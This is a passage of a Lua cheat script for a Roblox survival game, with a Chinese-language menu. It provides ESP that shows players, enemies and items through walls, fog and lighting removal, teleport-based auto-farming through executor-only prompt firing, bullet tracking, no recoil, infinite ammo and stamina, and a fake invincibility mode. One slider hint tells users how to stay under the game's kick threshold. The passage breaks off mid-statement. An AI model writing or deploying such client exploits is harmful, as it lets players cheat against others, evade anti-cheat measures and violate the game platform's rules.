			if lp.CameraMaxZoomDistance ~= 20 then lp.CameraMaxZoomDistance = 20 end
			if lp.CameraMinZoomDistance ~= 5 then lp.CameraMinZoomDistance = 5 end
		end)
	end)
	if tp3.CharConn then tp3.CharConn:Disconnect() end
	tp3.CharConn = lp.CharacterAdded:Connect(function(char)
		task.wait(0.5)
		if tp3.Active then
			pcall(function()
				lp.CameraMode = Enum.CameraMode.Classic
				lp.CameraMaxZoomDistance = 20
				lp.CameraMinZoomDistance = 5
			end)
		end
	end)
end

local function updateCameraLock()
	if tp3.CamLockConn then tp3.CamLockConn:Disconnect(); tp3.CamLockConn = null end
	if tp3.Active and tp3.CamLock then
		tp3.CamLockConn = RS.RenderStepped:Connect(function()
			local char = lp.Character
			local hrp = char and char:FindFirstChild("HumanoidRootPart")
			if hrp then
				local camCF = Cam.CFrame
				local lookDir = camCF.LookVector
				hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(lookDir.X, 0, lookDir.Z))
			end
		end)
	end
end

local nofogConns = {}
local nofogSaved = {}
local fullbrightConn = null
local fullbrightSaved = null

local HUD = Instance.new("ScreenGui")
HUD.Name = "StatusHUD"
HUD.ResetOnSpawn = false
HUD.IgnoreGuiInset = true
HUD.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 180, 0, 75)
Frame.Position = UDim2.new(1, -190, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.7
Frame.BorderSizePixel = 0
Frame.Parent = HUD

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 6)
Corner.Parent = Frame

local TimeLabel = Instance.new("TextLabel")
TimeLabel.Size = UDim2.new(1, -15, 0, 22)
TimeLabel.Position = UDim2.new(0, 10, 0, 5)
TimeLabel.BackgroundTransparency = 1
TimeLabel.Text = "时间: 加载中..."
TimeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TimeLabel.TextStrokeTransparency = 0.5
TimeLabel.TextSize = 13
TimeLabel.Font = Enum.Font.SourceSansBold
TimeLabel.TextXAlignment = Enum.TextXAlignment.Left
TimeLabel.Parent = Frame

local PowerLabel = Instance.new("TextLabel")
PowerLabel.Size = UDim2.new(1, -15, 0, 22)
PowerLabel.Position = UDim2.new(0, 10, 0, 26)
PowerLabel.BackgroundTransparency = 1
PowerLabel.Text = "电力: 加载中..."
PowerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PowerLabel.TextStrokeTransparency = 0.5
PowerLabel.TextSize = 13
PowerLabel.Font = Enum.Font.SourceSansBold
PowerLabel.TextXAlignment = Enum.TextXAlignment.Left
PowerLabel.Parent = Frame

local PseudoLabel = Instance.new("TextLabel")
PseudoLabel.Size = UDim2.new(1, -15, 0, 22)
PseudoLabel.Position = UDim2.new(0, 10, 0, 47)
PseudoLabel.BackgroundTransparency = 1
PseudoLabel.Text = "无敌: 关闭"
PseudoLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
PseudoLabel.TextStrokeTransparency = 0.5
PseudoLabel.TextSize = 13
PseudoLabel.Font = Enum.Font.SourceSansBold
PseudoLabel.TextXAlignment = Enum.TextXAlignment.Left
PseudoLabel.Parent = Frame

local function UpdateHUD()
	if not State.HUD_Display then
		HUD.Enabled = false
		return
	end
	HUD.Enabled = true
	
	pcall(function()
		local t = valuesFolder:GetAttribute("RoundTime")
		local p = valuesFolder:GetAttribute("Power")
		
		if t ~= null then
			if type(t) == "number" and t > 0 then
				TimeLabel.Text = "时间: " .. tostring(math.floor(t)) .. "s"
				TimeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			else
				TimeLabel.Text = "时间: 白天"
				TimeLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
			end
		else
			TimeLabel.Text = "时间: 未知"
			TimeLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
		end
		
		if p ~= null then
			if type(p) == "number" then
				PowerLabel.Text = "电力: " .. string.format("%.1f", p) .. "%"
				if p <= 10 then
					PowerLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
				elseif p <= 30 then
					PowerLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
				else
					PowerLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
				end
			else
				PowerLabel.Text = "电力: 未知"
				PowerLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
			end
		else
			PowerLabel.Text = "电力: 未知"
			PowerLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
		end
		
		if State.PseudoGod then
			PseudoLabel.Text = "无敌: 开启"
			PseudoLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
		else
			PseudoLabel.Text = "无敌: 关闭"
			PseudoLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
		end
	end)
end

Tabs.VisualTab:Toggle({
    Title = "除雾",
    Value = false,
    Callback = function(v)
        for _, conn in ipairs(nofogConns) do pcall(function() conn:Disconnect() end) end
        nofogConns = {}
        
        if v then
            nofogSaved.FogEnd = L.FogEnd
            nofogSaved.Atmospheres = {}
            L.FogEnd = 100000
            
            table.insert(nofogConns, L:GetPropertyChangedSignal("FogEnd"):Connect(function()
                L.FogEnd = 100000
            end))
            
            for _, atm in ipairs(L:GetDescendants()) do
                if atm:IsA("Atmosphere") then
                    nofogSaved.Atmospheres[atm] = atm.Density
                    atm.Density = 0
                    table.insert(nofogConns, atm:GetPropertyChangedSignal("Density"):Connect(function()
                        atm.Density = 0
                    end))
                end
            end
            
            table.insert(nofogConns, L.DescendantAdded:Connect(function(v)
                if v:IsA("Atmosphere") then
                    nofogSaved.Atmospheres[v] = v.Density
                    v.Density = 0
                    table.insert(nofogConns, v:GetPropertyChangedSignal("Density"):Connect(function()
                        v.Density = 0
                    end))
                end
            end))
        else
            if nofogSaved.FogEnd then L.FogEnd = nofogSaved.FogEnd end
            for atm, density in pairs(nofogSaved.Atmospheres or {}) do
                pcall(function() atm.Density = density end)
            end
            nofogSaved = {}
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "高亮",
    Value = false,
    Callback = function(v)
        if fullbrightConn then pcall(function() fullbrightConn:Disconnect() end) fullbrightConn = null end
        
        if v then
            fullbrightSaved = {
                Brightness = L.Brightness,
                ClockTime = L.ClockTime,
                FogEnd = L.FogEnd,
                GlobalShadows = L.GlobalShadows,
                OutdoorAmbient = L.OutdoorAmbient,
            }
            
            local function fb()
                L.Brightness = 2
                L.ClockTime = 14
                L.FogEnd = 100000
                L.GlobalShadows = false
                L.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
            
            fb()
            fullbrightConn = RS.RenderStepped:Connect(fb)
        else
            if fullbrightSaved then
                L.Brightness = fullbrightSaved.Brightness
                L.ClockTime = fullbrightSaved.ClockTime
                L.FogEnd = fullbrightSaved.FogEnd
                L.GlobalShadows = fullbrightSaved.GlobalShadows
                L.OutdoorAmbient = fullbrightSaved.OutdoorAmbient
                fullbrightSaved = null
            end
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "显示聊天框",
    Value = false,
    Callback = function(v)
        State.ForceChat = v
        if v then
            pcall(function()
                local TextChatService = game:GetService("TextChatService")
                local ok, chatWinCfg = pcall(function()
                    return TextChatService.ChatWindowConfiguration
                end)
                
                if ok and chatWinCfg then
                    chatWinCfg.Enabled = true
                    WindUI:Notify({
                        Title = "聊天框已启用",
                        Content = "聊天窗口已强制显示",
                        Duration = 3,
                        Icon = "check-circle"
                    })
                else
                    WindUI:Notify({
                        Title = "聊天框启用失败",
                        Content = "请确保聊天类型是 TextChatService",
                        Duration = 3,
                        Icon = "alert-triangle"
                    })
                end
            end)
        end
    end,
})

Tabs.VisualTab:Section({ Title = "ESP 颜色设置" })

Tabs.VisualTab:Colorpicker({
    Title = "玩家ESP颜色",
    Default = State.PlayerESP_Color,
    Callback = function(c)
        State.PlayerESP_Color = c
        for _, obj in pairs(espObjects.Players) do
            if obj.SetColor then obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Colorpicker({
    Title = "ChainESP颜色",
    Default = State.ChainESP_Color,
    Callback = function(c)
        State.ChainESP_Color = c
        for _, obj in pairs(espObjects.Chains) do
            if obj.SetColor then obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Colorpicker({
    Title = "建筑ESP颜色",
    Default = State.BuildingESP_Color,
    Callback = function(c)
        State.BuildingESP_Color = c
        for _, data in pairs(espObjects.Buildings) do
            if data.Obj and data.Obj.SetColor then data.Obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Colorpicker({
    Title = "废料ESP颜色",
    Default = State.ScrapESP_Color,
    Callback = function(c)
        State.ScrapESP_Color = c
        for _, data in pairs(espObjects.Scraps) do
            if data.Obj and data.Obj.SetColor then data.Obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Colorpicker({
    Title = "空投ESP颜色",
    Default = State.AirDropESP_Color,
    Callback = function(c)
        State.AirDropESP_Color = c
        for _, obj in pairs(espObjects.AirDrops) do
            if obj.SetColor then obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Colorpicker({
    Title = "神器ESP颜色",
    Default = State.ArtifactESP_Color,
    Callback = function(c)
        State.ArtifactESP_Color = c
        for _, obj in pairs(espObjects.Artifacts) do
            if obj.SetColor then obj:SetColor(c) end
        end
    end,
})

Tabs.VisualTab:Section({ Title = "ESP 透视" })

Tabs.VisualTab:Toggle({
    Title = "玩家 ESP",
    Value = false,
    Callback = function(v)
        State.PlayerESP = v
        if not v then
            for _, obj in pairs(espObjects.Players) do
                if obj.Remove then obj:Remove() end
            end
            espObjects.Players = {}
            return
        end
        
        for _, player in ipairs(P:GetPlayers()) do
            if player ~= lp then
                pcall(function()
                    local char = player.Character or player.CharacterAdded:Wait()
                    local hrp = char:WaitForChild("HumanoidRootPart", 5)
                    if hrp and not espObjects.Players[player] then
                        espObjects.Players[player] = ESP:Add({
                            Entity = player,
                            Part = hrp,
                            Name = player.Name,
                            Color = State.PlayerESP_Color,
                            Highlight = true,
                            Box = true,
                            Text = true,
                            Distance = true,
                            AlwaysOnTop = false,
                        })
                    end
                end)
            end
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "Chain ESP",
    Value = false,
    Callback = function(v)
        State.ChainESP = v
        if not v then
            for _, obj in pairs(espObjects.Chains) do
                if obj.Remove then obj:Remove() end
            end
            espObjects.Chains = {}
            return
        end
        
        for _, chain in ipairs(aiFolder:GetChildren()) do
            if chain:IsA("Model") and chain:FindFirstChild("Humanoid") then
                local hrp = chain:FindFirstChild("HumanoidRootPart")
                if hrp then
                    espObjects.Chains[chain] = ESP:Add({
                        Entity = chain,
                        Part = hrp,
                        Name = chain.Name,
                        Color = State.ChainESP_Color,
                        Highlight = true,
                        Box = true,
                        Text = true,
                        Distance = true,
                        AlwaysOnTop = true,
                        StudsOffset = Vector3.new(0, 3.5, 0),
                        BillboardSize = UDim2.new(0, 300, 0, 60),
                    })
                end
            end
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "建筑 ESP",
    Value = false,
    Callback = function(v)
        State.BuildingESP = v
        if not v then
            for _, data in pairs(espObjects.Buildings) do
                if data.Obj then data.Obj:Remove() end
                if data.Part then data.Part:Destroy() end
            end
            espObjects.Buildings = {}
            return
        end
        
        local buildings = {
            {Name = "发电站", Model = GameSections:FindFirstChild("POWERSTATION")},
            {Name = "仓库", Model = GameSections:FindFirstChild("WAREHOUSE")},
            {Name = "工作区", Model = GameSections:FindFirstChild("WORKSHOP")}
        }
        for _, building in ipairs(buildings) do
            if building.Model and not espObjects.Buildings[building.Model] then
                local pivot = building.Model:GetPivot()
                local _, bsize = building.Model:GetBoundingBox()
                
                local anchorPart = Instance.new("Part")
                anchorPart.Anchored = true
                anchorPart.CanCollide = false
                anchorPart.CanTouch = false
                anchorPart.CanQuery = false
                anchorPart.Transparency = 1
                anchorPart.Size = bsize
                anchorPart.CFrame = pivot
                anchorPart.Parent = W
                
                espObjects.Buildings[building.Model] = {
                    Obj = ESP:Add({
                        Entity = building.Model,
                        Part = anchorPart,
                        Name = building.Name,
                        Color = State.BuildingESP_Color,
                        Highlight = true,
                        Box = true,
                        Text = true,
                        Distance = true,
                        AlwaysOnTop = true,
                        StudsOffset = Vector3.new(0, 5, 0),
                        BillboardSize = UDim2.new(0, 300, 0, 50),
                    }),
                    Part = anchorPart
                }
            end
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "废料 ESP",
    Value = false,
    Callback = function(v)
        State.ScrapESP = v
        if not v then
            for _, data in pairs(espObjects.Scraps) do
                if data.Obj then data.Obj:Remove() end
                if data.Part then data.Part:Destroy() end
            end
            espObjects.Scraps = {}
            return
        end
        
        for _, scrap in ipairs(ScrapFolder:GetChildren()) do
            if scrap:IsA("Model") and scrap:GetAttribute("Scrap") then
                local hasPart = false
                for _, descendant in ipairs(scrap:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        hasPart = true
                        break
                    end
                end
                if hasPart and not espObjects.Scraps[scrap] then
                    local pivot = scrap:GetPivot()
                    local _, bsize = scrap:GetBoundingBox()
                    
                    local anchorPart = Instance.new("Part")
                    anchorPart.Anchored = true
                    anchorPart.CanCollide = false
                    anchorPart.CanTouch = false
                    anchorPart.CanQuery = false
                    anchorPart.Transparency = 1
                    anchorPart.Size = bsize
                    anchorPart.CFrame = pivot
                    anchorPart.Parent = W
                    
                    espObjects.Scraps[scrap] = {
                        Obj = ESP:Add({
                            Entity = scrap,
                            Part = anchorPart,
                            Name = "废料",
                            Color = State.ScrapESP_Color,
                            Highlight = true,
                            Box = true,
                            Text = true,
                            Distance = true,
                            AlwaysOnTop = true,
                            StudsOffset = Vector3.new(0, 2.5, 0),
                        }),
                        Part = anchorPart
                    }
                end
            end
        end
    end,
})

Tabs.VisualTab:Toggle({
    Title = "空投 ESP",
    Value = false,
    Callback = function(v)
        State.AirDropESP = v
        if not v then
            for _, obj in pairs(espObjects.AirDrops) do
                if obj.Remove then obj:Remove() end
            end
            espObjects.AirDrops = {}
            return
        end
        
        local AirDropsFolder = GameSections:FindFirstChild("AirDrops")
        if AirDropsFolder then
            for _, heli in ipairs(AirDropsFolder:GetChildren()) do
                if heli.Name == "AirDropHeli" then
                    local airdrop = heli:FindFirstChildWhichIsA("Model", true) or heli
                    if not espObjects.AirDrops[airdrop] then
                        local hrp = airdrop:FindFirstChild("HumanoidRootPart") or airdrop.PrimaryPart
                        if hrp then
                            espObjects.AirDrops[airdrop] = ESP:Add({
                                Entity = airdrop,
                                Part = hrp,
                                Name = "空投",
                                Color = State.AirDropESP_Color,
                                Highlight = true,
                                Box = true,
                                Text = true,
                                Distance = true,
                                AlwaysOnTop = true,
                                StudsOffset = Vector3.new(0, 5, 0),
                            })
                        end
                    end
                end
            end
        end
    end,
})

Tabs.VisualTab:Section({ Title = "神器/文物 ESP" })

Tabs.VisualTab:Toggle({
    Title = "神器 ESP",
    Value = false,
    Callback = function(v)
        State.ArtifactESP = v
        if v then
            for _, obj in pairs(espObjects.Artifacts) do
                if obj.Remove then obj:Remove() end
            end
            espObjects.Artifacts = {}
            
            local artifacts = findArtifacts()
            for _, artifact in ipairs(artifacts) do
                if not espObjects.Artifacts[artifact] then
                    local part = artifact
                    if artifact:IsA("Model") then
                        part = artifact:FindFirstChildWhichIsA("BasePart", true) or artifact.PrimaryPart
                        if not part then continue end
                    end
                    
                    espObjects.Artifacts[artifact] = ESP:Add({
                        Entity = artifact,
                        Part = part,
                        Name = "神器",
                        Color = State.ArtifactESP_Color,
                        Highlight = true,
                        Box = true,
                        Text = true,
                        Distance = true,
                        AlwaysOnTop = true,
                        StudsOffset = Vector3.new(0, 3, 0),
                        BillboardSize = UDim2.new(0, 200, 0, 50),
                    })
                end
            end
            
            if not espObjects.Artifacts.Connection then
                espObjects.Artifacts.Connection = W.DescendantAdded:Connect(function(obj)
                    if obj:IsA("BasePart") or obj:IsA("Model") then
                        local name = string.lower(obj.Name)
                        if string.find(name, "神器") or string.find(name, "文物") 
                           or string.find(name, "artifact") or string.find(name, "relic") then
                            if not espObjects.Artifacts[obj] then
                                local part = obj
                                if obj:IsA("Model") then
                                    part = obj:FindFirstChildWhichIsA("BasePart", true) or obj.PrimaryPart
                                    if not part then return end
                                end
                                espObjects.Artifacts[obj] = ESP:Add({
                                    Entity = obj,
                                    Part = part,
                                    Name = "神器",
                                    Color = State.ArtifactESP_Color,
                                    Highlight = true,
                                    Box = true,
                                    Text = true,
                                    Distance = true,
                                    AlwaysOnTop = true,
                                    StudsOffset = Vector3.new(0, 3, 0),
                                    BillboardSize = UDim2.new(0, 200, 0, 50),
                                })
                            end
                        end
                    end
                end)
            end
            
            WindUI:Notify({
                Title = "神器ESP",
                Content = "神器 (" .. #artifacts .. " 个)",
                Duration = 2,
                Icon = "check-circle"
            })
        else
            if espObjects.Artifacts.Connection then
                espObjects.Artifacts.Connection:Disconnect()
                espObjects.Artifacts.Connection = null
            end
            for _, obj in pairs(espObjects.Artifacts) do
                if obj.Remove then obj:Remove() end
            end
            espObjects.Artifacts = {}
        end
    end,
})

local HUDEnabledSection = Tabs.VisualTab:Section({
    Title = "状态显示器",
    Opened = true
})

HUDEnabledSection:Toggle({
    Title = "显示游戏状态",
    Value = true,
    Callback = function(v)
        State.HUD_Display = v
        UpdateHUD()
        WindUI:Notify({
            Title = "状态HUD",
            Content = v and "已开启" or "已关闭",
            Duration = 2,
            Icon = v and "check-circle" or "xmark"
        })
    end,
})

task.spawn(function()
    while true do
        UpdateHUD()
        task.wait(0.5)
    end
end)

local ServerSection = Tabs.ServerTab:Section({
    Title = "转服务器",
    Opened = true
})

local serverMonitorData = {
    servers = {},
    lastUpdate = 0,
    isUpdating = false,
    serverListSection = null,
    refreshConnection = null
}

local function getServerListForMonitor()
    local placeId = game.PlaceId
    local servers = {}
    local cursor = ""
    local pageCount = 0
    local maxPages = math.ceil(State.ServerMonitor_MaxServers / 100)
    
    repeat
        local url = string.format(
            "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
            placeId, cursor
        )
        
        local success, response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        
        if success and response and response.data then
            for _, server in ipairs(response.data) do
                if server.playing >= 0 and 
                   server.playing <= server.maxPlayers and
                   (State.ServerMonitor_ShowEmpty or server.playing > 0) and
                   (State.ServerMonitor_ShowFull or server.playing < server.maxPlayers) then
                    
                    table.insert(servers, {
                        id = server.id,
                        playing = server.playing,
                        maxPlayers = server.maxPlayers,
                        ping = server.ping or 0,
                        fps = server.fps or 0,
                        voteData = server.voteData or {},
                        name = server.name or "Unknown"
                    })
                end
            end
            cursor = response.nextPageCursor
            pageCount = pageCount + 1
        else
            break
        end
    until not cursor or pageCount >= maxPages or #servers >= State.ServerMonitor_MaxServers
    
    if State.ServerMonitor_SortBy == "ping" then
        table.sort(servers, function(a, b)
            return a.ping < b.ping
        end)
    elseif State.ServerMonitor_SortBy == "players" then
        table.sort(servers, function(a, b)
            return a.playing > b.playing
        end)
    elseif State.ServerMonitor_SortBy == "fps" then
        table.sort(servers, function(a, b)
            return a.fps > b.fps
        end)
    end
    
    return servers
end

local function updateServerListDisplay()
    if serverMonitorData.isUpdating then return end
    serverMonitorData.isUpdating = true
    
    WindUI:Notify({
        Title = "服务器监测",
        Content = "正在刷新服务器列表...",
        Duration = 2,
        Icon = "refresh"
    })
    
    serverMonitorData.servers = getServerListForMonitor()
    serverMonitorData.lastUpdate = tick()
    
    if serverMonitorData.serverListSection then
        serverMonitorData.serverListSection:Destroy()
    end
    
    serverMonitorData.serverListSection = Tabs.ServerTab:Section({
        Title = "服务器列表 (" .. #serverMonitorData.servers .. " 个)",
        Opened = true
    })
    
    for i, server in ipairs(serverMonitorData.servers) do
        local pingColor = "Green"
        if server.ping > 150 then
            pingColor = "Red"
        elseif server.ping > 80 then
            pingColor = "Yellow"
        end
        
        serverMonitorData.serverListSection:Paragraph({
            Title = string.format("服务器 #%d", i),
            Desc = string.format("延迟: %dms | 玩家: %d/%d | FPS: %d", 
                server.ping, server.playing, server.maxPlayers, server.fps),
            Color = pingColor,
            Icon = "server"
        })
        
        serverMonitorData.serverListSection:Button({
            Title = string.format("加入服务器 #%d", i),
            Callback = function()
                WindUI:Notify({
                    Title = "正在加入",
                    Content = string.format("延迟: %dms | 玩家: %d/%d", server.ping, server.playing, server.maxPlayers),
                    Duration = 3,
                    Icon = "server"
                })
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, lp)
            end
        })
        
        serverMonitorData.serverListSection:Divider()
    end
    
    serverMonitorData.isUpdating = false
    
    WindUI:Notify({
        Title = "服务器监测",
        Content = "刷新完成，找到 " .. #serverMonitorData.servers .. " 个服务器",
        Duration = 2,
        Icon = "check-circle"
    })
end

local function startAutoRefresh()
    if serverMonitorData.refreshConnection then
        serverMonitorData.refreshConnection:Disconnect()
    end
    
    serverMonitorData.refreshConnection = RS.Heartbeat:Connect(function()
        if not State.ServerMonitor then return end
        if not State.ServerMonitor_AutoRefresh then return end
        
        local currentTime = tick()
        if currentTime - serverMonitorData.lastUpdate >= State.ServerMonitor_Interval then
            updateServerListDisplay()
        end
    end)
end

ServerSection:Toggle({
    Title = "实时服务器监测",
    Value = false,
    Callback = function(v)
        State.ServerMonitor = v
        if v then
            updateServerListDisplay()
            startAutoRefresh()
            WindUI:Notify({
                Title = "服务器监测",
                Content = "已开始实时监测服务器状态",
                Duration = 3,
                Icon = "check-circle"
            })
        else
            if serverMonitorData.serverListSection then
                serverMonitorData.serverListSection:Destroy()
                serverMonitorData.serverListSection = null
            end
            if serverMonitorData.refreshConnection then
                serverMonitorData.refreshConnection:Disconnect()
                serverMonitorData.refreshConnection = null
            end
            WindUI:Notify({
                Title = "服务器监测",
                Content = "已停止实时监测",
                Duration = 3,
                Icon = "xmark"
            })
        end
    end,
})

ServerSection:Toggle({
    Title = "自动刷新服务器列表",
    Value = true,
    Callback = function(v)
        State.ServerMonitor_AutoRefresh = v
        if v and State.ServerMonitor then
            startAutoRefresh()
        end
    end,
})

ServerSection:Slider({
    Title = "刷新间隔 (秒)",
    Value = {
        Min = 10,
        Max = 120,
        Default = 30
    },
    Callback = function(v)
        State.ServerMonitor_Interval = v
    end,
})

ServerSection:Slider({
    Title = "显示服务器数量",
    Value = {
        Min = 5,
        Max = 50,
        Default = 20
    },
    Callback = function(v)
        State.ServerMonitor_MaxServers = v
    end,
})

ServerSection:Dropdown({
    Title = "排序方式",
    Multi = false,
    AllowNone = false,
    Value = "ping",
    Values = {"ping", "players", "fps"},
    Callback = function(sortBy)
        State.ServerMonitor_SortBy = sortBy
        if State.ServerMonitor then
            updateServerListDisplay()
        end
    end,
})

ServerSection:Toggle({
    Title = "显示空服务器",
    Value = false,
    Callback = function(v)
        State.ServerMonitor_ShowEmpty = v
        if State.ServerMonitor then
            updateServerListDisplay()
        end
    end,
})

ServerSection:Toggle({
    Title = "显示满服务器",
    Value = false,
    Callback = function(v)
        State.ServerMonitor_ShowFull = v
        if State.ServerMonitor then
            updateServerListDisplay()
        end
    end,
})

ServerSection:Button({
    Title = "立即刷新服务器列表",
    Callback = function()
        updateServerListDisplay()
    end,
})

local AutoPowerSection = Tabs.FuncTab:Section({
    Title = "自动发电机",
    Opened = true
})

AutoPowerSection:Toggle({
    Title = "自动发电机",
    Value = false,
    Callback = function(v)
        State.AutoPower = v
        if v then
            task.spawn(function()
                while State.AutoPower do
                    pcall(function()
                        local power = valuesFolder:GetAttribute("Power")
                        if type(power) == "number" and power <= 0 then
                            local char = lp.Character
                            local hrp = char and char:FindFirstChild("HumanoidRootPart")
                            local station = GameSections:FindFirstChild("POWERSTATION")
                            
                            if hrp and station then
                                local savedCF = hrp.CFrame
                                hrp.CFrame = CFrame.new(-208.299744, -110.604126, -120.227615)
                                task.wait(0.2)
                                
                                local startTime = tick()
                                while State.AutoPower and tick() - startTime < 60 do
                                    local curPower = valuesFolder:GetAttribute("Power")
                                    if type(curPower) == "number" and curPower > 0 then
                                        break
                                    end
                                    
                                    if isStationElectrified(station) then
                                        task.wait(0.5)
                                        continue
                                    end
                                    
                                    local alertUI = station:FindFirstChild("AlertUI")
                                    if alertUI then
                                        local gui = alertUI:FindFirstChild("GUI")
                                        if gui and not gui.Enabled then
                                            local prompt = station:FindFirstChildWhichIsA("ProximityPrompt", true)
                                            if prompt then
                                                fireproximityprompt(prompt)
                                            end
                                        end
                                    end
                                    
                                    task.wait(0.1)
                                end
                                
                                if hrp then
                                    hrp.CFrame = savedCF
                                end
                            end
                        end
                    end)
                    task.wait(1)
                end
            end)
        end
        WindUI:Notify({
            Title = "自动发电机",
            Content = v and "已开启" or "已关闭",
            Duration = 2,
            Icon = v and "check" or "xmark"
        })
    end,
})

local AutoScrapSection = Tabs.FuncTab:Section({
    Title = "自动捡废料",
    Opened = true
})

AutoScrapSection:Toggle({
    Title = "自动捡废料",
    Value = false,
    Callback = function(v)
        State.AutoScrap = v
        if v then
            task.spawn(function()
                while State.AutoScrap do
                    pcall(function()
                        local char = lp.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        
                        if hrp then
                            for _, scrap in ipairs(ScrapFolder:GetChildren()) do
                                if scrap:IsA("Model") and scrap:GetAttribute("Scrap") then
                                    local vals = scrap:FindFirstChild("Values")
                                    if vals and vals:GetAttribute("Available") == true then
                                        local hasPart = false
                                        for _, descendant in ipairs(scrap:GetDescendants()) do
                                            if descendant:IsA("BasePart") then
                                                hasPart = true
                                                break
                                            end
                                        end
                                        if hasPart then
                                            local dist = (hrp.Position - scrap:GetPivot().Position).Magnitude
                                            if dist <= State.ScrapRange then
                                                local prompt = scrap:FindFirstChildWhichIsA("ProximityPrompt", true)
                                                if prompt then
                                                    fireproximityprompt(prompt)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    task.wait(State.ScrapInterval)
                end
            end)
        end
        WindUI:Notify({
            Title = "自动捡废料",
            Content = v and "已开启" or "已关闭",
            Duration = 2,
            Icon = v and "check" or "xmark"
        })
    end,
})

AutoScrapSection:Slider({
    Title = "收集范围",
    Desc = "六秒内不要拾取太多否则会踢",
    Value = {
        Min = 10,
        Max = 200,
        Default = 50
    },
    Callback = function(v)
        State.ScrapRange = v
    end,
})

AutoScrapSection:Slider({
    Title = "收集间隔(秒)",
    Value = {
        Min = 1,
        Max = 6,
        Default = 6
    },
    Callback = function(v)
        State.ScrapInterval = v
    end,
})

Tabs.FuncTab:Section({ Title = "战斗功能" })

Tabs.FuncTab:Toggle({
    Title = "自动 QTE",
    Desc = "可能无效需要自行点击屏幕中间的按钮",
    Value = false,
    Callback = function(v)
        State.AutoQTE = v
        WindUI:Notify({
            Title = "自动 QTE",
            Content = v and "已开启" or "已关闭",
            Duration = 3,
            Icon = v and "alert-triangle" or "xmark"
        })
    end,
})

Tabs.FuncTab:Toggle({
    Title = "拼刀必胜",
    Value = false,
    Callback = function(v)
        State.WinClash = v
    end,
})

Tabs.FuncTab:Toggle({
    Title = "X锯无限燃油",
    Value = false,
    Callback = function(v)
        State.InfGas = v
    end,
})

local InfAmmoToggle = Tabs.FuncTab:Toggle({
    Title = "无限弹药",
    Value = false,
    Callback = function(v)
        State.InfAmmo = v
        toggleInfAmmo()
    end,
})

Tabs.FuncTab:Section({ Title = "子弹" })

Tabs.FuncTab:Toggle({
    Title = "子弹追踪",
    Value = false,
    Callback = function(v)
        State.BulletTrack = v
        bullet.TrackActive = v
        if v then
            setupBulletTrack()
            WindUI:Notify({
                Title = "子弹追踪",
                Content = "已开启",
                Duration = 2
            })
        else
            WindUI:Notify({
                Title = "子弹追踪",
                Content = "已关闭",
                Duration = 2
            })
        end
    end,
})

Tabs.FuncTab:Toggle({
    Title = "子弹轨迹",
    Value = false,
    Callback = function(v)
        State.BulletTrail = v
        bullet.TrailActive = v
        WindUI:Notify({
            Title = "子弹轨迹",
            Content = v and "已开启" or "已关闭",
            Duration = 2
        })
    end,
})

Tabs.FuncTab:Section({ Title = "枪械" })

Tabs.FuncTab:Toggle({
    Title = "无后坐力",
    Value = false,
    Callback = function(v)
        State.NoRecoil = v
        if v then
            hookRecoil()
            WindUI:Notify({
                Title = "无后坐力",
                Content = "已开启",
                Duration = 2
            })
        else
            restoreRecoil()
            WindUI:Notify({
                Title = "无后坐力",
                Content = "已关闭",
                Duration = 2
            })
        end
    end,
})

Tabs.FuncTab:Section({ Title = "生存" })

Tabs.FuncTab:Toggle({
    Title = "无限体力",
    Value = false,
    Callback = function(v)
        State.InfStamina = v
    end,
})

Tabs.FuncTab:Toggle({
    Title = "无限战斗体力",
    Value = false,
    Callback = function(v)
        State.InfCombatStamina = v
    end,
})

local PseudoGodToggle = Tabs.FuncTab:Toggle({
    Title = "伪无敌",
    Desc = "开启前请将本体藏在安全的地方",
    Value = false,
    Callback = function(v)
        State.PseudoGod = v
        if v then
            State.ChainDodge = false
            cAlert.Dodge = false
            
            local char = lp.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local torso = char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
            
            if hrp and torso then
                State.PseudoGodReturnPos = hrp.CFrame
                
                local blackGui = Instance.new("ScreenGui")
                blackGui.Name = "_BlackScreen"
                blackGui.IgnoreGuiInset = true
                blackGui.DisplayOrder = 999
                blackGui.Parent = lp.PlayerGui
                
                local blackFrame = Instance.new("Frame")
                blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
                blackFrame.Size = UDim2.new(1, 0, 1, 0)
                blackFrame.BorderSizePixel = 0
                blackFrame.Parent = blackGui
                
                hrp.CFrame = CFrame.new(-25.95, 84, 3537.55)
                task.wait(0.15)
                
                local seat = Instance.new("Seat")
                seat.Name = ""
